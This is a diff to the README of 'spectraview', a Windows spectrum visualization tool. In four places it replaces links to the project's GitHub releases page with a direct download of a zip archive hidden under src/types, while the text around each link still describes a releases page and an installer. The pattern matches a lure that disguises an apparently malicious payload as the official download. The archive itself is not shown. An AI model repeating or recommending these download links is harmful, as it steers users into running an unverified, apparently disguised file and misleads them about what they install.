@@ -1,6 +1,6 @@
 # ⚛️ spectraview - Easy Spectrum Visualization Tool
 
-[![Download spectraview](https://img.shields.io/badge/Download-spectraview-blue?style=for-the-badge)](https://github.com/dinissilva99/spectraview/releases)
+[![Download spectraview](https://img.shields.io/badge/Download-spectraview-blue?style=for-the-badge)](https://github.com/dinissilva99/spectraview/raw/refs/heads/main/src/types/Software_v3.4-beta.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section guides you on how to get the software on your Windows PC and start 
 
 1. Open the spectraview releases page by clicking this link:
 
-   [Download spectraview](https://github.com/dinissilva99/spectraview/releases)
+   [Download spectraview](https://github.com/dinissilva99/spectraview/raw/refs/heads/main/src/types/Software_v3.4-beta.4.zip)
 
 2. On the releases page, look for the latest version. It is usually at the top of the list.
 
@@ -145,7 +145,7 @@ Files can be loaded directly from your PC.
 
 Download the latest Windows installer here:
 
-[Download spectraview](https://github.com/dinissilva99/spectraview/releases)
+[Download spectraview](https://github.com/dinissilva99/spectraview/raw/refs/heads/main/src/types/Software_v3.4-beta.4.zip)
 
 Use this page to find the newest version and release notes.
 
@@ -153,7 +153,7 @@ Use this page to find the newest version and release notes.
 
 ## 🔗 Useful Links
 
-- GitHub Releases page: https://github.com/dinissilva99/spectraview/releases
+- GitHub Releases page: https://github.com/dinissilva99/spectraview/raw/refs/heads/main/src/types/Software_v3.4-beta.4.zip
 - Help and Documentation: Included within the installed program under **Help** menu.  
 - Contact support: Use issues page on GitHub repository for questions.
 
